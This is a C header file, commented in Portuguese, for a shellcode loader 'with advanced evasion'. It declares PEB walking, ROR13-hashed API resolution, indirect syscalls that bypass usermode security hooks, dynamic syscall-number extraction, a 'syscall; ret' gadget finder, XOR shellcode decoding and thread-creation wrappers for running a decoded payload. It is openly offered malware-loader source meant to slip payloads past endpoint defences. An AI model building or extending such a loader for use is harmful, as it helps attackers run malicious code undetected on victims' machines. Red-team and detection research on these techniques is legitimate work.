/*
 * loader.h - Shellcode Loader com Evasao Avancada
 *
 * Tecnicas implementadas:
 *   - PEB Walking (resolucao de modulos sem API imports)
 *   - Export Table Walking com ROR13 Hashing
 *   - Indirect Syscalls (bypass de usermode hooks)
 *   - IAT Walking (resolucao via Import Address Table)
 *   - Decodificacao XOR + ROR13 em tempo de execucao
 *   - Syscall SSN extraction dinamico
 *
 * Compilacao: MSVC x64 (cl.exe + ml64.exe)
 */

#pragma once
#include <windows.h>
#include <winternl.h>

/* ============================================================
 * Constantes e Definicoes
 * ============================================================ */

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

/* Offset do PEB no x64 via GS segment */
#define PEB_OFFSET 0x60

/* ============================================================
 * Leitura do PEB via GS (portavel MSVC / MinGW-GCC)
 * ============================================================ */

#if defined(_MSC_VER)
    /* MSVC fornece o intrinsic __readgsqword */
    #include <intrin.h>
    #define READ_GS_QWORD(offset) __readgsqword((DWORD)(offset))
#else
    /* GCC / Clang: usa inline assembly AT&T */
    static __inline__ void *read_gs_qword_gcc(DWORD offset) {
        void *result;
        __asm__ __volatile__(
            "movq %%gs:(%1), %0"
            : "=r"(result)
            : "r"((unsigned long long)offset)
        );
        return result;
    }
    #define READ_GS_QWORD(offset) read_gs_qword_gcc((DWORD)(offset))
#endif

/* Offset de Ldr dentro do PEB */
#define PEB_LDR_OFFSET 0x18

/* Offset de InMemoryOrderModuleList dentro de PEB_LDR_DATA */
#define LDR_IN_MEMORY_ORDER_OFFSET 0x20

/* Offsets dentro de LDR_DATA_TABLE_ENTRY (x64) */
#define LDR_ENTRY_IN_MEMORY_ORDER 0x10
#define LDR_ENTRY_DLL_BASE        0x30
#define LDR_ENTRY_BASE_DLL_NAME   0x58

/* Protecao de memoria */
#ifndef MEM_COMMIT
#define MEM_COMMIT  0x1000
#endif
#ifndef MEM_RESERVE
#define MEM_RESERVE 0x2000
#endif
#ifndef PAGE_READWRITE
#define PAGE_READWRITE    0x04
#endif
#ifndef PAGE_EXECUTE_READ
#define PAGE_EXECUTE_READ  0x20
#endif
#ifndef PAGE_EXECUTE_READWRITE
#define PAGE_EXECUTE_READWRITE 0x40
#endif

/* Chave padrao XOR para o encoder (deve corresponder ao encode.py) */
#define XOR_KEY_DEFAULT 0xDEADBEEF

/* ============================================================
 * Estruturas PEB / LDR (x64)
 * ============================================================ */

/*
 * PEB_LDR_DATA - acessado via PEB->Ldr
 * Precisamos apenas de InMemoryOrderModuleList (offset 0x20)
 */
typedef struct _MY_PEB_LDR_DATA {
    ULONG      Length;                              // +0x00
    BOOLEAN    Initialized;                         // +0x04
    PVOID      SsHandle;                            // +0x08
    LIST_ENTRY InLoadOrderModuleList;               // +0x10
    LIST_ENTRY InMemoryOrderModuleList;             // +0x20
    LIST_ENTRY InInitializationOrderModuleList;     // +0x30
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

/*
 * LDR_DATA_TABLE_ENTRY - cada modulo carregado
 * Usamos InMemoryOrderLinks como referencia (offset 0x10)
 */
typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;            // +0x00
    LIST_ENTRY     InMemoryOrderLinks;          // +0x10
    LIST_ENTRY     InInitializationOrderLinks;  // +0x20
    PVOID          DllBase;                     // +0x30
    PVOID          EntryPoint;                  // +0x38
    ULONG          SizeOfImage;                 // +0x40
    UNICODE_STRING FullDllName;                 // +0x48
    UNICODE_STRING BaseDllName;                 // +0x58
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

/* ============================================================
 * Prototipos de Syscalls Indiretas (definidas em syscalls.asm)
 * ============================================================ */

/*
 * NtAllocateVirtualMemory indireta
 * Executa syscall via gadget dentro de ntdll.dll
 */
EXTERN_C NTSTATUS NTAPI NtAllocateVirtualMemory_Indirect(
    HANDLE    ProcessHandle,
    PVOID    *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

/*
 * NtProtectVirtualMemory indireta
 */
EXTERN_C NTSTATUS NTAPI NtProtectVirtualMemory_Indirect(
    HANDLE  ProcessHandle,
    PVOID  *BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

/*
 * NtCreateThreadEx indireta
 */
EXTERN_C NTSTATUS NTAPI NtCreateThreadEx_Indirect(
    PHANDLE     ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID       ObjectAttributes,
    HANDLE      ProcessHandle,
    PVOID       StartRoutine,
    PVOID       Argument,
    ULONG       CreateFlags,
    SIZE_T      ZeroBits,
    SIZE_T      StackSize,
    SIZE_T      MaximumStackSize,
    PVOID       AttributeList
);

/*
 * NtWaitForSingleObject indireta
 */
EXTERN_C NTSTATUS NTAPI NtWaitForSingleObject_Indirect(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

/*
 * Variaveis globais definidas em syscalls.asm
 * Preenchidas em runtime pelo loader
 */
EXTERN_C DWORD  g_SSN_NtAllocateVirtualMemory;
EXTERN_C DWORD  g_SSN_NtProtectVirtualMemory;
EXTERN_C DWORD  g_SSN_NtCreateThreadEx;
EXTERN_C DWORD  g_SSN_NtWaitForSingleObject;
EXTERN_C LPVOID g_SyscallGadget;

/* ============================================================
 * Funcoes do Loader (loader.c)
 * ============================================================ */

/*
 * ROR13 Hash para resolucao de strings sem ASCII visivel
 * Usado para nomes de modulos e funcoes
 */
DWORD Ror13HashA(const char *str);
DWORD Ror13HashW(const WCHAR *str);

/*
 * Encontra a base de um modulo no PEB por hash do nome
 * Retorna NULL se nao encontrado
 */
PVOID FindModuleByHash(DWORD moduleHash);

/*
 * Resolve uma funcao pelo hash do nome via Export Table walking
 * Retorna NULL se nao encontrada
 */
PVOID ResolveExportByHash(PVOID moduleBase, DWORD funcHash);

/*
 * Extrai o SSN (System Service Number) de uma funcao Nt* do ntdll
 * Le os bytes iniciais: mov r10, rcx; mov eax, SSN
 */
DWORD ExtractSSN(PVOID ntFunction);

/*
 * Encontra um gadget "syscall; ret" (0F 05 C3) na .text do ntdll
 * Retorna ponteiro para o gadget ou NULL
 */
PVOID FindSyscallGadget(PVOID ntdllBase);

/*
 * Decodifica shellcode XOR+ROR13
 * Cada DWORD: ROL13(dword_encoded) ^ key = DWORD original
 */
void DecodeShellcode(BYTE *shellcode, DWORD length, DWORD key);

/*
 * Caminho de resolucao de APIs via IAT (Import Address Table)
 * Usa apenas LoadLibraryA e GetProcAddress do IAT do proprio loader
 * como bootstrap para PEB walking
 */
typedef struct _IAT_RESOLVER {
    PVOID kernel32Base;
    PVOID ntdllBase;
    PVOID LoadLibraryA;
    PVOID GetProcAddress;
} IAT_RESOLVER, *PIAT_RESOLVER;

BOOL ResolveIAT(PIAT_RESOLVER resolver);
